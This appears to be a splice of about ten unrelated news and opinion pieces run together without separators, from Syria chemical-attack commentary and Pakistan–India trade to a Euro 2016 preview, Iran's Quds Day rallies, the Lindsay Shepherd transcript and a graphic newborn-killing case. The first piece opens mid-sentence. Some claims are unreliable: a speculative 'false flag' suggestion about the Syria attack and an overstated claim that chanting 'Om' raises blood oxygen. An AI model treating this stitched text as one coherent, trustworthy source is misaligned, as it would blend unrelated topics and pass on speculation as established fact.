The latest incident, which comes at a very odd time - just days after the White House it will no longer pursue the ouster of Assad, cementing the Syrian leader's resolve not to do anything to infuriate the US administration - means Trump is faced with the same dilemma that faced his predecessor: whether to openly challenge Moscow and risk deep involvement in a Middle East war by seeking to punish Assad for using banned weapons, or compromise and accept the Syrian leader remaining in power at the risk of looking weak.
As reported last night, Trump described Tuesday's incident as "heinous actions by the Bashar al-Assad regime", but also faulted Obama for having failed to enforce the red line four years ago. Obama's spokesman declined to comment. Washington, Paris and London have drawn up a draft U.N. Security Council statement condemning the attack and demanding an investigation. Russia has the power to veto it, as it has done to block all previous resolutions that would harm Assad.
As a result, all eyes will now be on Trump's response.
As Reuters puts it, "Trump's response to a diplomatic confrontation with Moscow will be closely watched at home because of accusations by his political opponents that he is too supportive of Russian President Vladimir Putin. He has previously said the United States and Russia should work more closely in Syria to fight against Islamic State."
Should Trump engage, devolving relations between Russia and the US to a level last seen under the Obama administration, it will be interesting to watch the justification provided by the "Russia-hacking" conspiracy theorists.
Aside for US-Russia relations, the chemical attack in Idlib province, one of the last major strongholds of rebels that have fought since 2011 to topple Assad, will complicate diplomatic efforts to end a war that has killed hundreds of thousands of people and driven half of Syrians from their homes.
It is worth recalling that "Jihadist groups have a strong presence in Idlib alongside other rebel groups, some of which have received backing from powers including Turkey and the United States". It is in their interest to not only watch the conflict between Russia and the US escalate, but to do everything in their power to create false flag events that achieve this.
Finally, it is worth noting that over the past several months Western countries, including the United States, had been quietly dropping their demands that Assad leave power in any deal to end the war, accepting that the rebels no longer had the capability to topple him by force. The use of banned chemical weapons would make it harder for the international community to sign off on any peace deal that does not remove him, something that Assad - and the rebels - are all aware of. It goes without saying, that the Syrian president had the most to lose from launching a chemical attack just as both the military and diplomatic tide was turning in his favor.
British Foreign Secretary Boris Johnson, who two months ago shifted his country's policy by saying Assad should be allowed to run for re-election, said on Wednesday that he must go. "This is a barbaric regime that has made it impossible for us to imagine them continuing to be an authority over the people of Syria after this conflict is over."
And now, all eyes on Trump.
India and Pakistan appear to be putting decades of acrimony behind them as the Pakistan government approved granting the most favoured nation (MFN) status to India with a view to liberalising trade between the two countries and boosting the trade volume to $5 billion from $2.5 billion.
The decision was taken during a federal cabinet meeting chaired by prime minister Yousaf Raza Gilani in Islamabad. Announcing the decision at a press conference, federal information minister Firdous Ashiq Awan said that following an extensive briefing by the federal commerce secretary on Wednesday, the cabinet unanimously decided to grant India the MFN status. The move would help expand bilateral trade relations between the two nuclear-armed South Asian neighbours.
Following this move, Pakistan would lose the import restrict from India. At present, Islamabad allows import of only 1,946 items from New Delhi, whereas India does not allow trade of 850 items with Pakistan.
According to the Pakistani information minister, visa policies between the two countries would be made lenient and both sides would also remove non-tariff barriers and all other restrictive practices. India granted Pakistan MFN status in 1996, but Pakistan did not grant the same to India because of the events that followed, including the 26/11 Mumbai terror attacks.
Foreign minister Hina Rabbani Khan had informed the national assembly earlier this month that the government had in principle decided to give India the MFN status and a formal announcement was likely soon.
Islamabad first agreed to give this concession, which is primarily related to trade, to New Delhi during a visit by commerce minister Makhdoom Amin Fahim to India earlier in the year.
Subsequently, on October 28, hundreds of activists of several militant groups had resented the Pakistan government's move by taking out a grand rally in Lahore.
The fourth generation of gaming, especially the SNES brought an abundance of RPG's. The games had far more polish and depth than most of their 8 bit counterparts, and some of these RPG's, like Chrono Trigger or Final Fantasy VI, remain some of the best games of all time. Though SNES was the king of RPG's in the 16 bit battle, the Genesis and Game Boy had a few great RPG's and the nearly forgotten Sega CD had a couple classics itself.

The Islamic State (Isis) terrorists in Syria have released a new photo report that shows its fighters destroying dozens of tombs and headstones in the historical city of Palmyra.
On Monday, Twitter accounts affiliated to Isis released some 10 pictures, which they claimed were from the city of Palmyra. Monitoring agency SITE confirmed that the images were published by Isis affiliates from Syria's Homs province.
The Isis took over the ancient oasis city of Palmyra, also referred to as Tadmur in Syria, on 14 May and since then it was feared that the militant group might destroy the 2,000-year-old UNESCO world heritage site.
A CNN report had noted there were concerns that the group would bulldoze and tear down Palmyra in the same manner as they destroyed ancient ruins in the Assyrian city of Nimrud.
In March, Isis had bulldozed Nimrud in Mosul, which was seen as a priceless jewel in Iraq's archaeological heritage. The jihadist group had later posted a video online, showing its fighters destroying Nimrud's ancient ruins using barrel bombs, bulldozers and jackhammers.
The Isis, which is a Sunni militant group that practises the most orthodox form of Islam, considers ancient shrines and statues as "false idols" and believes they must be destroyed.
According to First Things, the reason why Isis destroys graves and its headstones is because the 'Salafi' group considers such practises as pagan. The Islamic State sees the practice of building tombs, epithets and decorations on graves as a kind of idolatry, or shirk, which obstructs the true Muslims from the absolute transcendence of God.
KOLKATA: A 14-year-old has wowed city scientists with her discovery of the impact of the ‘Om' sound in reducing fatigue. Anwesha Roy Chowdhury , a Class-IX student of Adamas World School , topped the recently held Science Congress organized by the state government.Her findings that chanting of ‘Om' increases oxygen level in blood and lowers carbon dioxide and lactic acid, which reduces the level of fatigue, were vetted by physics and physiology professors of Calcutta University and Jadavpur University . Debashish Bandopadhyay, head of the department of physiology, Calcutta University, told TOI, “Anwesha's project is innovative, it's quite flawless and convincing.”An-we-sha, who likes to spell her name thus, since anweshan in Bengal means ‘search', told TOI, “I found that sounds with a particular frequency, if heard or recited right, raises the level of neurotransmitters and hormones like serotonin, dopamine, DHEA etc. Because of their vasodilatory actions, the oxygen level in blood soars. It also produces less lactic acid and allows the person to act without fatigue.”“In the last decade, the body of research on workout music has swelled considerably, helping psychologists refine their ideas about why exercise and music are such an effective pairing. But this specific finding on the ‘Om' sound is impressive,” said Rina Venkataraman, secretary, state science and technology department.“No one has ever pin-pointed on the ‘Om' sound and conducted such comprehensive experiments on its use,” Dipankar Das, senior scientist, state science and technology department, said during a workshop conducted on 165 students who were shortlisted for the statewide Science Congress recently.It all began when Anwesha visited Uttarakhand, where she “found some priests carrying water from Bageshwar to Kedarnath, covering 68km every day, without tiring. The priests sang a tune all along. There was no way she could reproduce the same mantra for her experiments. So Anwesha started looking for a similar tune.“Finally, a tune with 430+ Hz frequency clicked. In five experiments in various laboratories, I measured the oxygen and carbon dioxide levels of 17 adults (all on the staff of BITM) while listening to the tune for 30 minutes, and there was an increase of oxygen level and decrease in carbon dioxide in their bodies,” Anwesha said.
During a seminar with first-year communications students, Wilfrid Laurier University teaching assistant Lindsay Shepherd screened a TVOntario debate to illustrate the sometimes-controversial politics of grammar.
The video, an episode of The Agenda with Steve Paikin, included University of Toronto professor Jordan Peterson presenting his case against the use of non-gendered pronouns. It also included panellists taking the opposite viewpoint.
Nevertheless, after an anonymous student complained, Shepherd found herself reprimanded for violating the school's Gendered and Sexual Violence policy
. In a subsequent meeting with university officials, she was accused of creating a “toxic” and “problematic” environment that constituted violence against transgendered students. She was also falsely told that she had broken the law.
Shepherd recorded the meeting. Audio and selected transcripts are below. The voices are of Shepherd, her supervising professor Nathan Rambukkana, another professor, Herbert Pimlott, as well as Adria Joel, manager of Gendered Violence Prevention and Support at the school.
00:00:56 “So you weren't, like, one of Jordan Peterson's students?”
Shepherd: Obviously this person (the complainant) who had an issue did not express it to me, they just went straight to whoever, I don't know what really happened.
Rambukkana: Just for some additional context so, you came from U of T is that right?
Shepherd: No, SFU.
Rambukkana: From SFU, okay. So you weren't, like, one of Jordan Peterson's students?
The meeting had just begun when Shepherd received this oblique accusation that she might be a protégé or supporter of Peterson's. Later in the meeting, Pimlott will expound on how people like Peterson live in a fantasy world of false conspiracies. However, it should be noted that upon encountering a teaching assistant who had mentioned an unpopular idea, one of Laurier's first assumptions was that she was somehow an agent of those ideas. Several times during the meeting, Shepherd will reiterate that her beliefs about gender had no bearing on her decision to screen the video. “I disagree with Jordan Peterson, but you people seem to think I'm pro-Jordan Peterson,” she says at one point.
00:03:10 “These arguments are counter to the Canadian Human Rights Code”
Rambukkana: …[Peterson] lectures about critiquing feminism, critiquing trans rights —
Shepherd: I'm familiar. I follow him. But can you shield people from those ideas? Am I supposed to comfort them and make sure that they are insulated away from this? Like, is that what the point of this is? Because to me, that is so against what a university is about. So against it. I was not taking sides. I was presenting both arguments.
Rambukkana: So the thing about this is, if you're presenting something like this, you have to think about the kind of teaching climate that you're creating. And this is actually, these arguments are counter to the Canadian Human Rights Code. Even since … C-16, ever since this passed, it is discriminatory to be targeting someone due to their gender identity or gender expression.
By C-16, Rambukkana is referring to a recently passed federal bill that prohibits discrimination based on gender identity or expression. His read of it is dead wrong; it's obviously not a violation of C-16 to screen a TVOntario program at a university. For one thing, the bill only applies to federally-regulated industries, which does not include universities. Even if it did, legal experts contacted by the National Post were extremely dubious that Shepherd's actions constituted anything remotely resembling discrimination.
00:04:22 “It has created a toxic climate for some of the students”
Shepherd: Like I said, it was in the spirit of debate.
Rambukkana: Okay, “in the spirit of the debate” is slightly different than ‘this is a problematic idea that we might want to unpack.'
Shepherd: But that's taking sides.
Rambukkana: Yes.
Shepherd: It's taking sides for me to be like “oh, look at this guy, like everything that comes out of his mouth is B.S. but we're going to watch anyway.”
Rambukkana: I understand the position that you're coming from and your positionality, but the reality is that it has created a toxic climate for some of the students, you know, it's great —
Shepherd: How many? Who? How many? One?
Rambukkana: May I speak?
Shepherd: I have no concept of how many people complained, what their complaint was, you haven't shown me the complaint.
Rambukkana: I understand that this is upsetting, but also confidentiality matters.
Shepherd: The number of people is confidential?
Rambukkana: Yes.
According to Shepherd, the seminar actually went pretty well; students considered the video, and soon got to discussing the use of gender neutral terms such as “they” instead of “him” or “her.” As Shepherd explained at the opening of her meeting with supervising professors, “there were people of all opinions.” Whoever took offence, she noted, did not approach her directly or even raise their concerns in class before filing a gendered violence complaint with university officials.
00:05:58 “… creates an unsafe learning environment for students.”
Rambukkana: Do you see how this is something that is not intellectually neutral, that is kind of “up for debate,” I mean this is the Charter of Rights and Freedoms.
Shepherd: But it is up for debate.
Rambukkana: You're perfectly welcome to your own opinion, but when you're bringing it into the context of the classroom that can become problematic, and that can become something that is, that creates an unsafe learning environment for students.
Shepherd: But when they leave the university they're going to be exposed to these ideas, so I don't see how I'm doing a disservice to the class by exposing them to ideas that are really out there. And I'm sorry I'm crying, I'm stressed out because this to me is so wrong, so wrong.
Joel: Can I mention the … Gendered and Sexual Violence Policy?
Once again, Rambukkana accuses Shepherd of breaking the law. But as with C-16, there is nothing in the Charter of Rights and Freedoms that prohibits what Shepherd did. The Charter says the exact opposite, in fact; one of the document's four “fundamental freedoms” is the “freedom of thought, belief, opinion and expression.” If someone ever launched a legal case against Shepherd for this, the Charter would be the document most likely to protect her from prosecution.
00:07:28 All perspectives are not valid.
Shepherd: What I have a problem with is, I didn't target anybody. Who did I target?
Joel: Trans folks.
Shepherd: By telling them ideas that are really out there? Telling them that? By telling them? Really?
Rambukkana: It's not just telling them. In legitimizing this as a valid perspective—
Shepherd: In a university all perspectives are valid.
Rambukkana: That's not necessarily true, Lindsay.
The tug-of-war between Shepherd and her supervising professor basically boiled down to single point. Shepherd argued the case that ideas, however controversial, deserve mention in the classroom. Rambukkana, however, held fast to the notion that some ideas are “problematic” and cannot be raised without being clearly labeled as such. In this, arguing against gender-neutral pronouns was compared to banning women's suffrage or claiming that cigarettes are harmless. Using a rhetorical tactic typically more at home on Reddit forums, Rambukkana and Pimlott would also thrice use the example of Nazi Germany. “This is like neutrally playing a speech by Hitler,” Rambukkana said at one point.
00:17:19 “The Nazis actually used … issues around the free speech idea.”
Pimlott: I would find it problematic if my tutorial leaders were representing positions that didn't have any substantial academic credibility to that evidence.
Shepherd: But he's still a public figure … this was on a TV show. He's still a public figure.
Pimlott: He's a public figure, and a lot of people there like (American white supremacist) Richard Spencer of, I don't like calling them alt-right, it gives them too much legitimacy, but Richard Spencer, right? The Nazis actually used, this is a historic—issues around the free speech idea in the 1920s in Weimar Germany as an issue around which which is what they're using now. We know that someone like Richard Spencer is using theories and ideas that don't have any academic credibility. He's a public figure. But in terms of, if we introduce someone, we give them greater credibility in a certain condition. I agree that there are public figures out there that bring people, uh, bring hatred, target groups and if you look at statistically the degree of suicide attempts of trans people, young people, it's the highest of any group in society. And, you know, it's, you go through — Indigenous people — and so on. There are things that don't have academic credibility and I just don't think—I personally think I have some problems, I have no problems with the fact that these things are out there and people are going to engage them but we have to think of the atmosphere that we also create for the learning process.
It's worth reiterating that this whole debacle happened within Wilfrid Laurier University's communications department. The program's whole job is to teach students how to legibly convey ideas. Despite this, the rambling semi-coherent answer above is quite typical of the other 43 minutes of the recording. Pimlott's mention of “academic credibility” is notable. It's not like the group is discussing an issue like climate change or evolution, in which there's a pretty clear scientific consensus on the truth. They're discussing language, and Laurier appears to be telling Shepherd to ignore the language ideas of any “public figure” who doesn't have appropriate academic credentials. Such a broad definition could presumably include anyone from William Shakespeare to J.K. Rowling.
00:22:06 Your neutrality is “kind of the problem”
Rambukkana: Do you understand how what happened was contrary to, sorry Adria, what was the policy?
Joel: Gendered and Sexual Violence.
Rambukkana: — Gendered and Sexual Violence Policy. Do you understand how —
Shepherd: Sorry, what did I violate in that policy.
Joel: Um, so, gender-based violence, transphobia, in that policy. Causing harm, um, to trans students by, uh, bringing their identity as invalid. Their pronouns as invalid — potentially invalid.
Shepherd: So I caused harm?
Joel: — which is, under the Ontario Human Rights Code a protected thing so something that Laurier holds as a value.
Shepherd: Ok, so by proxy me showing a YouTube video I'm transphobic and I caused harm and violence? So be it. I can't do anything to control that.
Rambukkana: Ok, so that's not something that you have an issue with? The fact that that happened? Are you sorry that it happened?
Shepherd: I know in my heart, and I expressed to the class, that I'm not transphobic and if any of them — again, I don't know what they said — but I don't think I gave away any kind of political position of mine. I remained very neutral, and uh—
Rambukkana: —that's kind of the problem.
Unlike with C-16 and the Charter of Rights and Freedoms, it is much more believable that Shepherd actually did violate the schools' Gendered and Sexual Violence Policy. The document is quite broad, and defines gendered violence as “an act or actions that reinforce gender inequalities resulting in physical, sexual, emotional, economic or mental harm.” The policy further stipulates that the“violence” can take the form of graffiti or text messages. Under these parameters, a YouTube video that made a student feel uncomfortable would seem to amply qualify.
00:25:16 Students don't have the “critical toolkit” to understand these things
Rambukkana: These are very young students, and something of that nature is not appropriate to that age of student, because they don't have …
Shepherd: 18?
Rambukkana: Yes.
Shepherd: They're adults.
Rambukkana: Yes, but they're very young adults. they don't have the critical toolkit to be able to pick it apart yet. This is one of the things we're teaching them, so this is why it becomes something that has to be done with a bit more care.
This is a theme that Pimlott takes up later in the recording; that Wilfrid Laurier University is bringing in young naïfs from a prejudice-filled society who aren't yet ready to handle complex ideas without proper training. He said it takes a while to properly challenge “the faith-based, family and other types of structures in society that they've been inculcated with for years.” The meeting concludes, by the way, with a note that Shepherd must now run her seminar notes past Rambukkana and obtain specific approval for any future media she intends to show. “I'll ask you not to play any more Jordan Peterson videos, or anything of the like,” Rambukkana said.

TEHRAN — Iran held major anti-Israel rallies across the country Friday, with protesters chanting “Death to Israel” and declaring that destroying the Jewish state is “the Muslim world's top priority.”
Iranians participating in Quds Day rallies also called for unity among pro-Palestinian groups against the “child-murdering” Israeli government, according to Iran's Tasnim News Agency.
Marchers in Tehran headed from various points of the city to the Friday prayer ceremony at Tehran University. Similar demonstrations were held in other cities and towns in Iran.

Iran's powerful Revolutionary Guard used the demonstration in the capital's Valiasr Square to showcase three surface-to-surface ballistic missiles, including the Zolfaghar — the type that Iran used this week to target the Islamic State group in Syria. The Guard said it fired six such missiles on Sunday at IS targets in the city of Deir el-Zour, more than 600 kilometers (370 miles) away. The Guard said the airstrike was in retaliation for an IS attack earlier in June on Iran's parliament and a shrine in Tehran that killed 18 people and wounded more than 50.
Another missile on display at the Tehran rally was the Ghadr, with a range of 2,000 kilometers (1,250 miles) that can reach both Israel and US bases in the region.
Iran's ballistic missile program has been the subject of persistent concern in Washington and the target of repeated US sanctions.
Iran claimed its missile strike on Sunday killed 360 Islamic State fighters. Israeli sources, by contrast, said the strike was a “flop,” that most of the six or seven missiles missed their targets, and that three of them fell to earth in Iraq and didn't even reach Syria.
Iranian President Hassan Rouhani, in remarks carried by the official IRNA news agency, said Israel supports “terrorists in the region.”
Parliament speaker Ali Larijani, in a speech to Tehran demonstrators, called Israel the “mother of terrorism” and said that in the “20th century, there was no event more ominous than establishing the Zionist regime.”
The rally also inaugurated a huge digital countdown display at Tehran Palestine Square, showing that Israel will allegedly cease to exist in 8,411 days.
In 2015, Iran's Supreme Leader Ayatollah Ali Khamenei predicted that after 25 years — by 2040 — there will no longer be a State of Israel.
“Death to the House of Saud and Daesh,” demonstrators chanted, using another name for the Islamic State. “Death to America”, “Death to Israel”, “Death to the UK.”
This year's commemoration comes amid an intensifying battle for influence in the region between Shiite Iran and its Sunni arch rival Saudi Arabia who have had no diplomatic relations since January last year.
State media put the number of participants at over 1 million.
The anti-Israel rallies are an annual event marking Al-Quds Day, a historic Arabic name for Jerusalem. Iran says it's an occasion to express support for the Palestinians and emphasize the importance of Jerusalem for Muslims.
Iran doesn't recognize Israel, calls for its demise, and staunchly backs terror groups, including Hamas and Hezbollah.
In comments ahead of the day, Khamenei said the rallies were meant to “fight arrogance and global hegemons,” likely hinting at recent tensions with Sunni Gulf states.
“Defending Palestine today is defending a reality much greater than the issue of Palestine,” he said, according to the semi-official Tasnim News site.
Iran holds al-Quds day rallies held each year on the last Friday of the Muslim holy month of Ramadan, which is expected to end this weekend. Iran has marked the day since the start of its 1979 Islamic Revolution, when it cut relations with Israel.
On Sunday, marchers in the annual Quds Day parade in London blamed a fire in a low-income apartment complex there that left at least 58 dead on “Zionists.”
Euro 2016 Group C Preview
Germany:
Germany's team is still full of the talented superstars that won the World Cup two years ago, but their qualifying campaign showed that they are not as impressive as they were in Brazil. It is fair to say that Germany have the strongest squad with players such as Manuel Neuer, Jerome Boateng, Mesut Özil and Thomas Müller to name but a few. However, it appears that Joachim Löw's men have missed talisman Philipp Lahm and top goalscorer Miroslav Klose.
Squad Analysis:
(27-man provisional squad)
Goalkeepers: Manuel Neuer (Bayern Munich), Bernd Leno (Bayer Leverkusen), Marc-Andre ter-Stegen (Barcelona)
Defenders: Jerome Boateng (Bayern Munich), Emre Can (Liverpool), Jonas Hector (Koln), Benedikt Howedes (Schalke), Mats Hummels (Borussia Dortmund), Shkodran Mustafi (Valencia), Antonio Rudiger (Roma), Sebastian Rudy (Hoffenheim)
Midfielders: Sami Khedira (Juventus), Bastian Schweinsteiger (Manchester United), Mesut Ozil (Arsenal), Andre Schurrle (Wolfsburg), Marco Reus (Borussia Dortmund), Karim Bellarabi (Bayer Leverkusen), Toni Kroos (Real Madrid), Mario Gotze (Bayern Munich), Julian Draxler (Wolfsburg), Leroy Sané (Schalke), Julian Brandt (Bayer Leverkusen), Julian Weigl (Borussia Dortmund), Joshua Kimmich (Bayern Munich)
Forwards: Thomas Muller (Bayern Munich), Mario Gomez (Besiktas), Lukas Podolski (Galatasaray)
Germany's squad again shows their strength and depth when it comes to goalkeepers. The incredible Manuel Neuer, who was named third best player in the world last January, will almost certainly be the starting goalkeeper but Barcelona's Marc-André ter Stegen and Leverkusen's Bernd Leno are certainly adept replacements if called upon.
Defensively, Germany are also very strong. Philipp Lahm's absence may be felt but Jonas Hector is proficient replacement for the former captain. The central defensive partnership of Mats Hummels and Jerome Boateng—who will be team-mates next year—is perhaps one of the best in the world. Boateng's pace and composure on the ball and Hummels' aerial ability make them a very strong partnership. Neither of the two centre-backs played in Germany's second half capitulation to England earlier this year. The defence also has fantastic depth with Emre Can, Shkodran Mustafi, Benedikt Höwedes and Antonio Rüdiger all ready to make an impact if needed.
In the midfield area, Die Mannschaft are strongest in the tournament. Defensive-minded midfielders Sami Khedira and Toni Kroos will allow more creative and attacking midfielders Marco Reus, Mesut Özil and Mario Götze the chance to flourish. The young exciting talents of Julian Weigl and Julian Draxler show Germany's dynamic and creative midfield options while again highlighting their depth.
It is attacking-wise where Germany's problems lie. The squad has a lot of attacking talent especially in midfield but lacks an out-and-out striker. Thomas Müller is very talented but it will be interesting to see if he is deployed as a centre-forward or on the wing by Joachim Löw. Strikers Mario Gomez and Lukas Podolski bring useful experience but their age may limit their influence.
Manager: Joachim Löw
Löw has spent a decade as Germany manager and two years ago finally won a major tournament after eight years of tantalisingly close efforts that ultimately ended in disappointment. The 56-year-old was expected to stand down after 2014's triumph but he showed his ambitious nature by signing an extension until the end of the 2018 World Cup.
How they qualified
Germany's qualification campaign was not a straightforward as it usually is. In a difficult group including the resilient Poland, Scotland and Ireland, the World Cup holders eventually won the group but had more than a few disappointing performances.
Die Mannschaft struggled against Scotland before eventually winning 2-1 in Dortmund before a shock 2-0 defeat in Warsaw. They then dropped two points at home to Ireland in Gelsenkirchen after John O'Shea headed home a 94th minute equalizer. Another disappointing defeat came in Dublin as Shane Long secured a historic victory for the Irish.
Germany ended their qualifying campaign with a less than convincing 2-1 win over Georgia in Leipzig. Friendly defeats to England and the Netherlands highlighted that they are not currently on the top of their game but a 4-1 win over Italy in their last match showed glimpses of the 2014 success.
Ukraine
Squad Analysis:
(28-man provisional squad)
Goalkeepers: Andriy Pyatov (Shakhtar Donetsk), Denys Boyko (Besiktas), Mykyta Shevchenko (Zorya Lugansk)
Defenders: Vyacheslav Shevchuk, Yaroslav Rakitskyi, Oleksandr Kucher (all Shakhtar Donetsk), Yevgen Khacheridi (Dynamo Kiev), Artem Fedetskyi (Dnipro Dnipropetrovsk), Mykyta Kamenyuka (Zorya Lugansk), Bogdan Butko (Amkar Perm)
Midfielders: Anatoliy Tymoshchuk (Kairat), Taras Stepanenko, Viktor Kovalenko, Maksym Malyshev (all Shakhtar Donetsk), Ruslan Rotan, Yevgen Shakhov (both Dnipro Dnipropetrovsk), Yevgen Konoplyanka (Sevilla), Oleg Gusyev, Sergiy Rybalka, Denys Garmash, Sergiy Sydorchuk, Andriy Yarmolenko (all Dynamo Kiev), Oleksandr Karavayev, Ivan Petryak (both Zorya Lugansk), Oleksandr Zinchenko (Ufa)
Forwards: Roman Zozulya (Dnipro Dnipropetrovsk), Artem Kravets (Stuttgart), Pylyp Budkivskyi (Zorya Lugansk)
Ukraine's squad is an interesting one. Most of the squad (23/28) are from within the Ukrainian league and this leads to them having a very unknown squad which potentially could work in their advantage. However, the squad also includes well-known players in the form of the highly sought after Andriy Yarmolenko who has been a target for both Merseyside clubs over the past couple of weeks.
As well as Yarmolenko, the squad includes veterans Andriy Pyatov and Anatoliy Tymoschchuk, who will bring valuable experience, and forward Artem Kravets who has impressed for Dynamo Kyiv over the past couple of seasons. However, the squad arguably relies too heavily on players from within Ukraine and lacks wide range of talented stars.
Manager: Mykhaylo Fomenko
The country are led by experienced manager Mykhaylo Fomenko. The 67-year-old has managed 20 teams since his managerial career began in 1979 and will be hoping his travelled career will help him bring success to Ukraine.
How they qualified
Ukraine qualified for the tournament through the play-offs beating Slovenia 3-1 on aggregate after finishing third in their qualifying group behind Spain and Slovakia.
Poland
Squad Analysis:
(28-man provisional squad)
Goalkeepers: Artur Boruc (Bournemouth), Łukasz Fabianski (Swansea City), Wojciech Szczesny (Roma), Przemysław Tyton (Stuttgart)
Defenders: Thiago Cionek (Palermo), Paweł Dawidowicz (Benfica), Kamil Glik (Torino), Artur Jedrzejczyk (Legia Warsaw), Michał Pazdan (Legia Warsaw), Lukasz Piszczek (Borussia Dortmund), Maciej Rybus (Terek Grozny), Bartosz Salamon (Cagliari), Jakub Wawrzyniak (Lechia Gdansk)
Midfielders: Jakub Blaszczykowski (Fiorentina), Kamil Grosicki (Rennes), Tomasz Jodlowiec (Legia Warsaw), Bartosz Kapustka (Cracovia), Grzegorz Krychowiak (Sevilla), Karol Linetty (Lech Poznan), Krzysztof Mączynski (Wisła Krakow), Slawomir Peszko (Lechia Gdansk), Filip Starzynski (Zaglebie Lubin), Paweł Wszołek (Verona), Piotr Zielinski (Empoli)
Forwards: Robert Lewandowski (Bayern Munich), Arkadiusz Milik (Ajax), Artur Sobiech (Hannover), Mariusz Stepinski (Ruch Chorzow).
The Poland squad is full of real talent including Robert Lewandowski, Jakub Blaszczykowski and Grzegorz Krychowiak to name but a few. Poland are very strong in terms of goalkeepers with Stuttgart's Przemysław Tyton and Premier League goalkeepers Artur Boruc and Łukasz Fabianski, as well as Wojciech Szczesny. They are arguably weakest in defence but still have strength in Borussia Dortmund's Lukasz Piszczek and Torino's Kamil Glik.
In midfield, Poland are very strong with the outstanding Grzegorz Krychowiak providing strong cover for the defence behind him, as well as Jakub Blaszczykowski bringing the creative spark in midfield. Attacking-wise Poland are also very strong, with Robert Lewandowski leading the line. The 27-year-old has been in sensational form for Bayern Munich this season, finding the net 42 times. He was top goalscorer in qualifying with 13 goals in 10 games. Arkadiusz Milik and Artur Sobiech also provide good cover in attack.
Manager: Adam Nawalka
Manager Adam Nawalka has been a revelation for Poland since taking up the post as manager three years ago. Losing just three times in his first 29 games, he has taken a side that failed to impress in World Cup qualifying to one of the stronger sides in the whole competition. The 58-year-old has also seemed to have got the best out of Robert Lewandowski internationally.
How they qualified
Poland qualified for finals after finishing second in their qualifying group with Germany, Scotland and the Republic of Ireland. The best moment of their impressive qualifying campaign was an historic win over rivals Germany in Warsaw.
Northern Ireland
Squad Analysis:
Michael O'Neill has not yet named his squad for the Euros but it will certainly be intriguing when he does. Northern Ireland surprisingly qualified for their first major tournament since 1986 after years of disappointment.
Many believe that the squad is not strong enough to compete with the likes of Germany and Poland with just four players from the Premier League (Evans, McNair, McAuley, Davis) in their most recent squad showing this. However, O'Neill's men showed their passion, character and quality on their day in qualifying and who's to say that they can't compete with Europe's big hitters?
Kyle Lafferty was the surprise talisman for Northern Ireland, scoring seven goals in qualifying—only five players scored more than the 28-year-old. Steven Davis and Johnny Evans will also be key players.
Manager: Michael O'Neill
Michael O'Neill worked wonders by leading Northern Ireland to their first tournament in 30 years. The 46-year-old was under pressure after winning just two of his opening 22 games in charge of the national team. However, he has since been heralded as a Northern Irish hero and any doubts about him have been dispelled.
How they qualified
Northern Ireland qualified for their first major tournament in three decades by topping Group F. The group had been labelled ‘easy' by some but it is worth remembering that they were the pot five team in the group when it was drawn. Memorable wins include doing the double over 2004 Euro winners Greece, who finished last in Group F behind the Faroe Islands, managed by none other than Leicester's Claudio Ranieri, and a 2-1 win in Budapest over Hungary.
Man 'smashed his newborn daughter's skull with a cinder block because he couldn't afford another baby'
Mother also faces murder charges as 'she knew her boyfriend planned to kill baby'
She already had five children under the age of nine
Little girl died just hours after she was born
A father allegedly killed his baby daughter with a cinder block just hours after she was born - because he and the little girl's mother couldn't afford to have another child.
Christopher Fitzpatrick, 20, allegedly told his girlfriend, Jennifer Barrise, 'I just want to get rid of it' as she started having contractions while they were out shopping near their home in Lake Ariel, Pennsylvania.
Both have now been charged with criminal homicide after police found their daughter's tiny body buried in woodland near Fitzpatrick's workplace.
Arrested: Christopher Fitzpatrick, 20, is accused of beating his newborn daughter to death with a cinder block in woodland near where he worked in Pennsylvania
Barrise, 28, already has five little boys, all aged under nine. The youngest, Christopher - her first child with Fitzpatrick - was born just a year ago in Franklin, New Jersey, where the couple used to live.
Now the couple are both being held at Wayne County Jail on murder charges. Police claim Barrise knew Fitzpatrick planned to kill their baby.
According to an arrest affidavit both have admitted the charges.
The alleged killing happened on the Saturday of Memorial Day weekend, just hours after Barrise went into labour when the couple were at a grocery store with Fitzpatrick's 11-year-old sister.
Charged: Jennifer Barrise sobs as she is led away to be charged with murder. Police say she knew her boyfriend planned to kill their baby
According to police, as her contractions began the 20-year-old yelled at his girlfriend: 'Have this (expletive) baby. I just want to get rid of it. I gotta do what I gotta do.'
She said: 'What do you want to do, kill it?', but Fitzpatrick didn't reply. Their car wouldn't start, but as they waited for help he allegedly said: 'hurry up and have this baby, I want to get rid of it.'
Barrise again asked if he was going to kill the baby, but he stayed silent, police say.
When Barrise had the baby, the little girl landed on the floor - and neither of her parents touched her as she lay crying, the affidavit claims.
According to police, Fitzpatrick drove his girlfriend, daughter and sister back to their home, but later picked up the baby and drove to M n D Lawn Care, where he worked.
Violent death: A handmade wooden cross marks the spot where the newborn baby was found buried beneath a cinder block
Grief: A sign outside M n D, where the little girl was found, reads 'we are devastated beyond words'. A memorial service will be held there on June 25
There he allegedly picked up a cinder block and dropped it twice on his daughter's head, smashing her skull.
Then he buried her tiny body beneath the concrete block and drove home.
The birth only came to light the next day, when Fitzpatrick's sister told her family Barrise had had the baby in her brother's car.
Her parents immediately rang Fitzpatrick, and he initially told them he had taken his daughter to a hospital, but he couldn't remember the name.
His family called every hospital within a two-hour drive, but couldn't track the baby down - so they confronted Fitzpatrick.
He allegedly told his uncle he had taken the baby into the woods and buried her there.
Shock: Ruth DiPalma, who owns the lawn company where Fitzpatrick works, plans to hold a memorial service for the little girl
His mother later testified Fitzpatrick had once told her he and Barrise didn't have enough money to look after another baby.
Soon afterwards state troopers went to the lawn company to search the grounds. When Fitzpatrick arrived he allegedly showed officers where he had buried the little girl, and confessed to the murder.
Shocked residents are to hold a memorial service for the little girl at the lawn company next weekend. Its owner, Ruth DiPalma, has already built a cross in her memory.
She told the Times-Tribune: 'This was not the person we hired. It's a different person. I can't tell you how horrified and completely devastated we are. We had absolutely no idea.'
Barrise's five sons, aged one, two, four, five and nine, are being looked after by relatives.
The family were featured in their local New Jersey newspaper last year after Barrise gave birth to her youngest son on the kitchen floor when she went into labour suddenly.
BANGOR, Maine — Holiday parades in Bangor and Ellsworth have been cancelled because of icy weather forecast for Saturday.
Neither parade has been rescheduled.
“We're just not going to do one this year and I'm so sorry. People have put so much work into the floats and everything,” Barbara McDade, co-chairman of the Rotary Club of Bangor's Festival of Lights parades committee, said late Friday afternoon.
“It's just so much work to put on a parade that we couldn't figure out how to have it at another time,” she said.
With freezing rain and sleet anticipated for much of the state through the afternoon and into the evening Saturday, “We were just afraid of floats skidding into the crowd or off the road,” McDade said. “We could deal with snow, but with the rain?”
